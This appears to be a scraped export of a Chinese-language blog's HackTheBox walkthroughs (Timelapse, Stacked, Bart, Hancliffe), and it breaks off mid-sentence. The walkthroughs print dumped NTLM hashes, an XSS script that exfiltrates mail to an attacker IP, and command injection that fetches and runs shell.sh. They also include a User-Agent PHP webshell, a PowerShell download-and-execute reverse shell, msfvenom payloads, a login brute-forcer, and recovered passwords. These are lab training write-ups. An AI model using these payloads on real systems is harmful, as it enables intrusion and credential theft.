(domain\\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:de0a7e3d696666f33e663464f1800940:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2960d580f05cd511b3da3d3663f3cb37:::timelapse.htb\\thecybergeek:1601:aad3b435b51404eeaad3b435b51404ee:c81875d2b3cd404f3c8eadc820248f06:::timelapse.htb\\payl0ad:1602:aad3b435b51404eeaad3b435b51404ee:f63b1edaad2ee253c3c228c6e08d1ea0:::timelapse.htb\\legacyy:1603:aad3b435b51404eeaad3b435b51404ee:93da975bcea111839cc584f2f528d63e:::timelapse.htb\\sinfulz:1604:aad3b435b51404eeaad3b435b51404ee:72b236d9b0d49860267f752f1dfc8103:::timelapse.htb\\babywyrm:1605:aad3b435b51404eeaad3b435b51404ee:d47c7e33d6911bb742fdf040af2e80da:::timelapse.htb\\svc_deploy:3103:aad3b435b51404eeaad3b435b51404ee:c912f3533b7114980dd7b6094be1a9d8:::timelapse.htb\\TRX:5101:aad3b435b51404eeaad3b435b51404ee:4c7121d35cd421cbbd3e44ce83bc923e:::DC01$:1000:aad3b435b51404eeaad3b435b51404ee:cac5b5386bf075ebd4699b205150cd52:::DB01$:1606:aad3b435b51404eeaad3b435b51404ee:d9c629d35e3311abba1631dba29ead96:::WEB01$:1607:aad3b435b51404eeaad3b435b51404ee:3b2910d8e6c79bbb20e8842ea4a9aeac:::DEV01$:1608:aad3b435b51404eeaad3b435b51404ee:463c7639ff204594dfbebbe71b3c6dbb:::[*] Cleaning up... 参考资料 How To Export LAPS Passwords from Active Directory with Powershell - Smart Home Pursuitshttps://smarthomepursuits.com/export-laps-passwords-powershell/ n00py/LAPSDumper: Dumping LAPS from Pythonhttps://github.com/n00py/LAPSDumper Hackthebox - Timelapse 靶场实战https://mp.weixin.qq.com/s/uyMi5koh5yiQyMbWanGh7g HTB - Timelapse Discussion | BreachForumshttps://breached.co/Thread-HTB-Timelapse-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Stacked - HackTheBox","slug":"Stacked-HackTheBox","date":"2022-03-23T05:50:51.000Z","updated":"2022-03-23T05:51:51.199Z","comments":true,"path":"2022/03/23/Stacked-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/03/23/Stacked-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/379 10.10.11.112 端口扫描22,80,2376(全端口能扫到): 123456789101112131415161718192021222324252627282930313233$ nmap -sC -sV 10.10.11.112Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 10:45 CSTNmap scan report for 10.10.11.112Host is up (0.18s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 12:8f:2b:60:bc:21:bd:db:cb:13:02:03:ef:59:36:a5 (RSA)| 256 af:f3:1a:6a:e7:13:a9:c0:25:32:d0:2c:be:59:33:e4 (ECDSA)|_ 256 39:50:d5:79:cd:0e:f0:24:d3:2c:f4:23:ce:d2:a6:f2 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-title: Did not follow redirect to http://stacked.htb/|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: Host: stacked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 62.57 seconds$ nmap -p 2376 -sC -sV 10.10.11.112Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 10:53 CSTNmap scan report for stacked.htb (10.10.11.112)Host is up (0.18s latency).PORT STATE SERVICE VERSION2376/tcp open ssl/docker?| ssl-cert: Subject: commonName=0.0.0.0| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1| Not valid before: 2021-07-17T15:37:02|_Not valid after: 2022-07-17T15:37:02Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds 80需要加hosts： 110.10.11.112 stacked.htb 子域名子域名可以扫到portfolio，同样加hosts： 12gobuster vhost -u http://stacked.htb/ -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k -t 50 | grep 200Found: portfolio.stacked.htb (Status: 200) [Size: 30268] portfolio.stacked.htbLocalstack Localstack页面可以下载docker-compose.yml文件： docker-compose.yml12345678910111213141516171819202122232425version: \"3.3\"services: localstack: container_name: \"$&#123;LOCALSTACK_DOCKER_NAME-localstack_main&#125;\" image: localstack/localstack-full:0.12.6 network_mode: bridge ports: - \"127.0.0.1:443:443\" - \"127.0.0.1:4566:4566\" - \"127.0.0.1:4571:4571\" - \"127.0.0.1:$&#123;PORT_WEB_UI-8080&#125;:$&#123;PORT_WEB_UI-8080&#125;\" environment: - SERVICES=serverless - DEBUG=1 - DATA_DIR=/var/localstack/data - PORT_WEB_UI=$&#123;PORT_WEB_UI- &#125; - LAMBDA_EXECUTOR=$&#123;LAMBDA_EXECUTOR- &#125; - LOCALSTACK_API_KEY=$&#123;LOCALSTACK_API_KEY- &#125; - KINESIS_ERROR_PROBABILITY=$&#123;KINESIS_ERROR_PROBABILITY- &#125; - DOCKER_HOST=unix:///var/run/docker.sock - HOST_TMP_FOLDER=\"/tmp/localstack\" volumes: - \"/tmp/localstack:/tmp/localstack\" - \"/var/run/docker.sock:/var/run/docker.sock\" XSScontact那里可以发邮件，存在xss检测： 实际可用的xss触发点在referer那里，这个需要试行错误： mail监测收到的请求信息，可以发现来自mail子域名,id=2： 有2就有1，尝试通过xss获取1的内容： s3根据得到的内容，发现aws s3 id1.js1234567891011var fetch_req = new XMLHttpRequest();fetch_req.onreadystatechange = function() &#123; if(this.readyState == 4 &amp;&amp; fetch_req.readyState == XMLHttpRequest.DONE) &#123; var exfil_req = new XMLHttpRequest(); exfil_req.open(\"POST\", \"http://10.10.14.5:7778\", false); exfil_req.send(\"Resp Code: \" + fetch_req.status + \"\\nPage Source:\\n\" + fetch_req.response); &#125;&#125;;fetch_req.open(\"GET\", \"http://mail.stacked.htb/read-mail.php?id=1\", false);fetch_req.send(); AWS S3得到的s3域名加hosts，可以外部访问： 1s3-testing.stacked.htb 根据已有信息搜索： Hack the Stack with LocalStack: Code Vulnerabilities Explainedhttps://blog.sonarsource.com/hack-the-stack-with-localstack 可以通过lambda函数进行命令注入 lambda to shell 后续就是根据文档，创建lambda函数，在function-name参数中注入命令： create-function — AWS CLI 1.22.79 Command Referencehttps://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html 创建函数，函数名命令注入，xss重定向到对应界面触发命令注入： 123456789zip index.zip index.js aws lambda --endpoint=http://s3-testing.stacked.htb create-function \\ --function-name \"api;wget\\$&#123;IFS&#125;10.10.14.5/shell.sh;bash\\$&#123;IFS&#125;shell.sh\" \\ --runtime nodejs12.x \\ --handler index.handler \\ --memory-size 128 \\ --zip-file fileb://index.zip \\ --role arn:aws:iam::123456789012:role/lambda-role index.js1234exports.handler = async function(event, context) &#123; console.log(\"EVENT: \\n\" + JSON.stringify(event, null, 2)) return context.logStreamName&#125; user flag现在是在容器内，localstack用户目录得到user.txt: localstack root在当前容器内运行pspy64之类，会发现创建lambda的时候它内部调用了unzip后，调用docker命令使用了我们创建lambda时的一些参数，这里直接用0xdf的结果了： 12342021/08/25 20:28:45 CMD: UID=0 PID=990 | unzip -o -q /tmp/localstack/zipfile.83615cde/original_lambda_archive.zip2021/08/25 20:30:59 CMD: UID=0 PID=1003 | /bin/sh -c CONTAINER_ID=\"$(docker create -i -e DOCKER_LAMBDA_USE_STDIN=\"$DOCKER_LAMBDA_USE_STDIN\" -e LOCALSTACK_HOSTNAME=\"$LOCALSTACK_HOSTNAME\" -e EDGE_PORT=\"$EDGE_PORT\" -e _HANDLER=\"$_HANDLER\" -e AWS_LAMBDA_FUNCTION_TIMEOUT=\"$AWS_LAMBDA_FUNCTION_TIMEOUT\" -e AWS_LAMBDA_FUNCTION_NAME=\"$AWS_LAMBDA_FUNCTION_NAME\" -e AWS_LAMBDA_FUNCTION_VERSION=\"$AWS_LAMBDA_FUNCTION_VERSION\" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN=\"$AWS_LAMBDA_FUNCTION_INVOKED_ARN\" -e AWS_LAMBDA_COGNITO_IDENTITY=\"$AWS_LAMBDA_COGNITO_IDENTITY\" -e NODE_TLS_REJECT_UNAUTHORIZED=\"$NODE_TLS_REJECT_UNAUTHORIZED\" --rm \"lambci/lambda:nodejs12.x\" \"index.handler\")\";docker cp \"/tmp/localstack/zipfile.4ef57e23/.\" \"$CONTAINER_ID:/var/task\"; docker start -ai \"$CONTAINER_ID\"; 2021/08/25 20:30:59 CMD: UID=0 PID=1002 | /bin/sh -c CONTAINER_ID=\"$(docker create -i -e DOCKER_LAMBDA_USE_STDIN=\"$DOCKER_LAMBDA_USE_STDIN\" -e LOCALSTACK_HOSTNAME=\"$LOCALSTACK_HOSTNAME\" -e EDGE_PORT=\"$EDGE_PORT\" -e _HANDLER=\"$_HANDLER\" -e AWS_LAMBDA_FUNCTION_TIMEOUT=\"$AWS_LAMBDA_FUNCTION_TIMEOUT\" -e AWS_LAMBDA_FUNCTION_NAME=\"$AWS_LAMBDA_FUNCTION_NAME\" -e AWS_LAMBDA_FUNCTION_VERSION=\"$AWS_LAMBDA_FUNCTION_VERSION\" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN=\"$AWS_LAMBDA_FUNCTION_INVOKED_ARN\" -e AWS_LAMBDA_COGNITO_IDENTITY=\"$AWS_LAMBDA_COGNITO_IDENTITY\" -e NODE_TLS_REJECT_UNAUTHORIZED=\"$NODE_TLS_REJECT_UNAUTHORIZED\" --rm \"lambci/lambda:nodejs12.x\" \"index.handler\")\";docker cp \"/tmp/localstack/zipfile.4ef57e23/.\" \"$CONTAINER_ID:/var/task\"; docker start -ai \"$CONTAINER_ID\"; 2021/08/25 20:30:59 CMD: UID=0 PID=1010 | /bin/sh -c CONTAINER_ID=\"$(docker create -i -e DOCKER_LAMBDA_USE_STDIN=\"$DOCKER_LAMBDA_USE_STDIN\" -e LOCALSTACK_HOSTNAME=\"$LOCALSTACK_HOSTNAME\" -e EDGE_PORT=\"$EDGE_PORT\" -e _HANDLER=\"$_HANDLER\" -e AWS_LAMBDA_FUNCTION_TIMEOUT=\"$AWS_LAMBDA_FUNCTION_TIMEOUT\" -e AWS_LAMBDA_FUNCTION_NAME=\"$AWS_LAMBDA_FUNCTION_NAME\" -e AWS_LAMBDA_FUNCTION_VERSION=\"$AWS_LAMBDA_FUNCTION_VERSION\" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN=\"$AWS_LAMBDA_FUNCTION_INVOKED_ARN\" -e AWS_LAMBDA_COGNITO_IDENTITY=\"$AWS_LAMBDA_COGNITO_IDENTITY\" -e NODE_TLS_REJECT_UNAUTHORIZED=\"$NODE_TLS_REJECT_UNAUTHORIZED\" --rm \"lambci/lambda:nodejs12.x\" \"index.handler\")\";docker cp \"/tmp/localstack/zipfile.4ef57e23/.\" \"$CONTAINER_ID:/var/task\"; docker start -ai \"$CONTAINER_ID\"; 命令注入可以直接通过命令注入运行我们前面的shell，只是运行用户的权限不同了： 123aws lambda create-function --function-name shell --handler 'index.handler;$(bash /opt/code/localstack/shell.sh)' --zip-file fileb://index.zip --role arn:aws:iam::123456789012:role/lambda-role --endpoint-url http://s3-testing.stacked.htb --runtime nodejs12.xaws lambda invoke --function-name shell --endpoint-url http://s3-testing.stacked.htb out.json 提权信息容器内root可以运行docker相关命令进行枚举： 提权 &amp; root flag常规的容器挂载逃逸： 参考资料 Hack the Stack with LocalStack: Code Vulnerabilities Explainedhttps://blog.sonarsource.com/hack-the-stack-with-localstack create-function — AWS CLI 1.22.79 Command Referencehttps://docs.aws.amazon.com/cli/latest/reference/lambda/create-function.html HTB: Stacked | 0xdf hacks stuffhttps://0xdf.gitlab.io/2022/03/19/htb-stacked.html https://www.hackthebox.com/home/machines/writeup/379 HackTheBox - Stacked - YouTubehttps://www.youtube.com/watch?v=aWXfEDIYZu8&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Bart - HackTheBox","slug":"Bart-HackTheBox","date":"2022-03-08T07:51:09.000Z","updated":"2023-03-08T07:51:53.573Z","comments":true,"path":"2022/03/08/Bart-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/03/08/Bart-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Bart 10.10.10.81 端口扫描 只有80: 123456789101112131415$ nmap -sC -sV -Pn 10.10.10.81Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 14:31 CSTNmap scan report for 10.10.10.81Host is up (0.064s latency).Not shown: 999 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods:|_ Potentially risky methods: TRACE|_http-title: Did not follow redirect to http://forum.bart.htb/|_http-server-header: Microsoft-IIS/10.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 68.43 seconds 80 需要加hosts 110.10.10.81 forum.bart.htb 子域名扫描子域名发现monitor： 1234567ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u \"http://forum.bart.htb/\" -H 'Host: FUZZ.bart.htb' -fs 0[Status: 200, Size: 35529, Words: 2090, Lines: 549, Duration: 95ms] * FUZZ: forum [Status: 200, Size: 3423, Words: 385, Lines: 81, Duration: 1522ms] * FUZZ: monitor monitor同样加hosts后访问，PHP Server Monitor v3.2.1： monitorforum那里可以得到一些用户名,有两个注释掉了,源码里可以看到，然后通过monitor的忘记密码功能来识别有效账号 harveycewl从网页生成字典，破解出来harvey的密码,有CSRF token，脚本破解： 12345cewl -w cewl-forum.txt -e -a http://forum.bart.htbpython3 brute_monitor_login.py cewl-forum.txt[+] Found password: potter internal-chat登录后，internal-chat里发现另一个子域名： brute_monitor_login.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#!/usr/bin/env python3import reimport requestsimport sysfrom multiprocessing import PoolMAX_PROC = 50url = \"http://monitor.bart.htb/\"username = \"harvey\"#&lt;input type=\"hidden\" name=\"csrf\" value=\"aab59572a210c4ee1f19ab55555a5d829e78b8efdbecd4b2f68bd485d82f0a57\" /&gt;csrf_pattern = re.compile('name=\"csrf\" value=\"(\\w+)\" /')def usage(): print(\"&#123;&#125; [wordlist]\".format(sys.argv[0])) print(\" wordlist should be one word per line]\") sys.exit(1)def check_password(password): # get csrf token and PHPSESSID r = requests.get(url) csrf = re.search(csrf_pattern, r.text).group(1) PHPSESSID = [x.split('=')[1] for x in r.headers['Set-Cookie'].split(';') if x.split('=')[0] == 'PHPSESSID'][0] # try login: data = &#123;\"csrf\": csrf, \"user_name\": username, \"user_password\": password, \"action\": \"login\"&#125; proxies = &#123;'http': 'http://127.0.0.1:8080'&#125; headers = &#123;'Cookie': \"PHPSESSID=&#123;&#125;\".format(PHPSESSID)&#125; r = requests.post(url, data=data, proxies=proxies, headers=headers) if '&lt;p&gt;The information is incorrect.&lt;/p&gt;' in r.text: return password, False else: return password, Truedef main(wordlist, nprocs=MAX_PROC): with open(wordlist, 'r', encoding='latin-1') as f: words = f.read().rstrip().replace('\\r','').split('\\n') words = [x.lower() for x in words] + [x.capitalize() for x in words] + words + [x.upper() for x in words] pool = Pool(processes=nprocs) i = 0 print_status(0, len(words)) for password, status in pool.imap_unordered(check_password, [pass_ for pass_ in words]): if status: sys.stdout.write(\"\\n[+] Found password: &#123;&#125; \\n\".format(password)) pool.terminate() sys.exit(0) else: i += 1 print_status(i, len(words)) print(\"\\n\\nPassword not found\\n\")def print_status(i, l, max=30): sys.stdout.write(\"\\r|&#123;&#125;&gt;&#123;&#125;| &#123;:&gt;15&#125;/&#123;&#125;\".format( \"=\" * ((i*max)//l), \" \" * (max - ((i*max)//l)), i, l))if __name__ == '__main__': if len(sys.argv) != 2: usage() main(sys.argv[1]) internal加hosts后访问： 这是一个开源项目： magkopian/php-ajax-simple-chat: This is the ‘Simple Chat ;)’, a simple AJAX chat application written in PHP and Javascript with jQuery.https://github.com/magkopian/php-ajax-simple-chat register删除了register_form.php页面，但可以直接请求register.php： 1curl -X POST http://internal-01.bart.htb/simple_chat/register.php -d \"uname=miao&amp;passwd=12345678\" saveChat查看代码，发现自定义的saveChat： 日志注入测试直接查看log.php,发现我们的UA被记录： 1http:&#x2F;&#x2F;internal-01.bart.htb&#x2F;log&#x2F;log.php?filename&#x3D;log.php&amp;username&#x3D;harvey 这是一个php文件，UA也是我们可控的，那就可以直接注入php代码写一个webshell： 123&gt;&gt;&gt; import requests&gt;&gt;&gt; headers=&#123;'User-Agent':'miao: &lt;?php phpinfo(); ?&gt;'&#125;&gt;&gt;&gt; r = requests.get('http://internal-01.bart.htb/log/log.php?filename=log.php&amp;username=harvey', headers=headers) webshell12&gt;&gt;&gt; headers&#x3D;&#123;&#39;User-Agent&#39;:&quot;miao: &lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt;&quot;&#125;&gt;&gt;&gt; r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;internal-01.bart.htb&#x2F;log&#x2F;log.php?filename&#x3D;log.php&amp;username&#x3D;harvey&#39;, headers&#x3D;headers) reverse shell12&gt;&gt;&gt; cmd &#x3D; &quot;powershell IEX(New-Object Net.WebClient).downloadString(&#39;http:&#x2F;&#x2F;10.10.14.25:7777&#x2F;Invoke-PowerShellTcp.ps1&#39;)&quot;&gt;&gt;&gt; r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;internal-01.bart.htb&#x2F;log&#x2F;log.php?filename&#x3D;log.php&amp;username&#x3D;harvey&amp;cmd&#x3D;&#123;&#125;&#39;.format(cmd)) 提权信息基础的枚举，注册表中得到密码： (meterpreter的话注意要32位payload,然后再migrate到64位) 1234567use post/windows/manage/archmigrate# 必须要64位上下文才能看到结果reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2&gt;nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\" DefaultDomainName REG_SZ DESKTOP-7I3S68E DefaultUserName REG_SZ Administrator DefaultPassword REG_SZ 3130438f31186fbaf962f407711faddb 提权 &amp; flags因为只有80对外，所以只能在已有shell上使用Administrator的账号密码： 1234567891011powershell -exec bypass$username = \"BART\\Administrator\"$password = \"3130438f31186fbaf962f407711faddb\"$secstr = New-Object -TypeName System.Security.SecureString$password.ToCharArray() | ForEach-Object &#123;$secstr.AppendChar($_)&#125;$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstrInvoke-Command -ScriptBlock &#123; whoami &#125; -Credential $cred -Computer localhostInvoke-Command -ScriptBlock &#123; cat C:\\users\\h.potter\\Desktop\\user.txt &#125; -Credential $cred -Computer localhostInvoke-Command -ScriptBlock &#123; cat C:\\users\\Administrator\\Desktop\\root.txt &#125; -Credential $cred -Computer localhost 参考资料 magkopian/php-ajax-simple-chat: This is the ‘Simple Chat ;)’, a simple AJAX chat application written in PHP and Javascript with jQuery.https://github.com/magkopian/php-ajax-simple-chat HTB: Bart | 0xdf hacks stuffhttps://0xdf.gitlab.io/2018/07/15/htb-bart.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Hancliffe - HackTheBox","slug":"Hancliffe-HackTheBox","date":"2022-03-07T08:15:06.000Z","updated":"2022-03-07T08:17:24.740Z","comments":true,"path":"2022/03/07/Hancliffe-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/03/07/Hancliffe-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/388 10.10.11.115 端口扫描80，8000，9999: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556nmap -sC -sV 10.10.11.115Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 13:35 CSTNmap scan report for 10.10.11.115Host is up (0.086s latency).Not shown: 997 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http nginx 1.21.0|_http-title: Welcome to nginx!|_http-server-header: nginx/1.21.08000/tcp open http nginx 1.21.0|_http-open-proxy: Proxy might be redirecting requests|_http-title: HashPass | Open Source Stateless Password Manager|_http-server-header: nginx/1.21.09999/tcp open abyss?| fingerprint-strings:| DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:| Welcome Brankas Application.| Username: Password:| NULL:| Welcome Brankas Application.|_ Username:1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port9999-TCP:V=7.92%I=7%D=3/7%Time=622599EF%P=x86_64-apple-darwin20.4.0SF:%r(NULL,27,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20\")%r(GetRSF:equest,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20Password:\\SF:x20\")%r(HTTPOptions,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\SF:x20Password:\\x20\")%r(FourOhFourRequest,31,\"Welcome\\x20Brankas\\x20ApplicSF:ation\\.\\nUsername:\\x20Password:\\x20\")%r(JavaRMI,31,\"Welcome\\x20Brankas\\SF:x20Application\\.\\nUsername:\\x20Password:\\x20\")%r(GenericLines,31,\"WelcoSF:me\\x20Brankas\\x20Application\\.\\nUsername:\\x20Password:\\x20\")%r(RTSPRequSF:est,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20Password:\\x20SF:\")%r(RPCCheck,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20PasSF:sword:\\x20\")%r(DNSVersionBindReqTCP,31,\"Welcome\\x20Brankas\\x20ApplicatiSF:on\\.\\nUsername:\\x20Password:\\x20\")%r(DNSStatusRequestTCP,31,\"Welcome\\x2SF:0Brankas\\x20Application\\.\\nUsername:\\x20Password:\\x20\")%r(Help,31,\"WelcSF:ome\\x20Brankas\\x20Application\\.\\nUsername:\\x20Password:\\x20\")%r(SSLSessSF:ionReq,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20Password:\\SF:x20\")%r(TerminalServerCookie,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUSF:sername:\\x20Password:\\x20\")%r(TLSSessionReq,31,\"Welcome\\x20Brankas\\x20ASF:pplication\\.\\nUsername:\\x20Password:\\x20\")%r(Kerberos,31,\"Welcome\\x20BrSF:ankas\\x20Application\\.\\nUsername:\\x20Password:\\x20\")%r(SMBProgNeg,31,\"WSF:elcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20Password:\\x20\")%r(X11PSF:robe,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20Password:\\x2SF:0\")%r(LPDString,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20PSF:assword:\\x20\")%r(LDAPSearchReq,31,\"Welcome\\x20Brankas\\x20Application\\.\\SF:nUsername:\\x20Password:\\x20\")%r(LDAPBindReq,31,\"Welcome\\x20Brankas\\x20ASF:pplication\\.\\nUsername:\\x20Password:\\x20\")%r(SIPOptions,31,\"Welcome\\x20SF:Brankas\\x20Application\\.\\nUsername:\\x20Password:\\x20\")%r(LANDesk-RC,31,SF:\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20Password:\\x20\")%r(TeSF:rminalServer,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x20PassSF:word:\\x20\")%r(NCP,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsername:\\x2SF:0Password:\\x20\")%r(NotesRPC,31,\"Welcome\\x20Brankas\\x20Application\\.\\nUsSF:ername:\\x20Password:\\x20\");Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 221.08 seconds 80nginx默认页面： 8000密码管理系统，使用的开源hashpass： scottparry/hashpass: A Stateless Password Manager written in PHPhttps://github.com/scottparry/hashpass 9999一个自定义服务，需要用户名密码： 目录扫描80端口目录扫描可以发现一个maintenance跳转到/nuxeo/Maintenance: 123gobuster dir -u http://10.10.11.115/ -w /usr/share/dirb/wordlists/common.txt -x asp,aspx,php,html,txt -t 50/maintenance (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/] 但直接访问是404: 路径处理nexeo是一个java的cms，而前端是nginx，所以可能存在路径标准化处理问题： https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf 123&#x2F;maintenance&#x2F;..;&#x2F; 会变成这个的404nxstartup.faces 12&#x2F;maintenance&#x2F;..;&#x2F;nuxeo&#x2F;nxstartup.faces会处理到login.jsp 12&#x2F;maintenance&#x2F;..;&#x2F;nuxeo&#x2F;login.jsp会进入到nexeo的404页面 目录扫描基于以上规则，进一步进行目录扫描： 123456789101112131415161718192021222324gobuster dir -u \"http://10.10.11.115/maintenance/..;\" -w /usr/share/dirb/wordlists/common.txt -x jsp -t 50/analytics (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/analytics/]/authentication (Status: 401) [Size: 220]/directory (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/directory/]/group (Status: 401) [Size: 220]/index.jsp (Status: 302) [Size: 0] [--&gt; http://10.10.11.115/nuxeo/nxstartup.faces]/jsf (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/jsf/]/login (Status: 401) [Size: 220]/logout (Status: 401) [Size: 220]/login.jsp (Status: 200) [Size: 8872]/oauth (Status: 401) [Size: 220]/pages (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/pages/]/pagination (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/pagination/]/resources (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/resources/]/scripts (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/scripts/]/search (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/search/]/tinymce (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/tinymce/]/ui (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/ui/] /user (Status: 401) [Size: 220]/users (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/users/]/viewer (Status: 401) [Size: 220]/webservices (Status: 401) [Size: 220]/widgets (Status: 302) [Size: 0] [--&gt; /nuxeo/Maintenance/..;/widgets/]/ws (Status: 401) [Size: 220] login.jsp根据结果，可以访问到login，底部可以看到版本号 FT 10.2 ： 1http:&#x2F;&#x2F;10.10.11.115&#x2F;maintenance&#x2F;..;&#x2F;login.jsp nexeo根据版本可以搜到相关漏洞： mpgn/CVE-2018-16341: CVE-2018-16341 - Nuxeo Remote Code Execution without authentication using Server Side Template Injectionhttps://github.com/mpgn/CVE-2018-16341 svc_account修改exp中相关路径，执行，现在我们有svc_account权限： reverse shell1234msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe -o msf.execurl http://10.10.14.15:7777/msf.exe -o /programdata/msf.exe/programdata/msf.exe Unified Remote 3查看文件可以发现一个Unified Remote 3： 这个版本相关漏洞： Unified Remote 3.9.0.2463 - Remote Code Execution - Windows remote Exploithttps://www.exploit-db.com/exploits/49587 exploit端口转发出来，修改exp中下载目录，执行，获得shell： 1234567# meterpreterportfwd add -l 9512 -p 9512 -r 127.0.0.1exp中 \"C:\\Windows\\Temp\" 修改为 \"C:\\\\programdata\\\\\"msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4445 -f exe &gt; rev.exepython 49587.py 127.0.0.1 10.10.14.15 rev.exe user flag clara桌面得到user.txt: firefox信息搜集可以发现clara用户存在firefox相关配置文件, 这里方便操作直接用meterpreter了： 1use post/multi/gather/firefox_creds Firepwd(新版本winpeas会自动解出来这个密码) 使用Firepwd进行解密,得到一个development相关密码，查看用户也能看到development用户： lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwordshttps://github.com/lclevy/firepwd 12decrypting login&#x2F;password pairshttp:&#x2F;&#x2F;localhost:8000:b&#39;hancliffe.htb&#39;,b&#39;#@H@ncLiff3D3velopm3ntM@st3rK3y*!&#39; development使用这些信息返回8000端口，生成密码： 1234developmenthancliffe.htb#@H@ncLiff3D3velopm3ntM@st3rK3y*!AMl.q2DHp?2.C&#x2F;V0kNFU winrm查看用户相关信息的时候也可以知道development可以远程，所以winrm端口也转发出来，使用生成的密码登录成功： 1portfwd add –l 5985 –p 5985 –r 127.0.0.1 devappdevapp里可以发现一个exe，就是9999端口那个，下载下来分析： BOF具体分析详见0xdf博客及视频，大概就是校验用户名密码通过后进入到_SaveCreds函数，这个函数中code那里使用的strcpy，存在BOF 还涉及到几个加密算法的分析逆向 EXE Analysis with 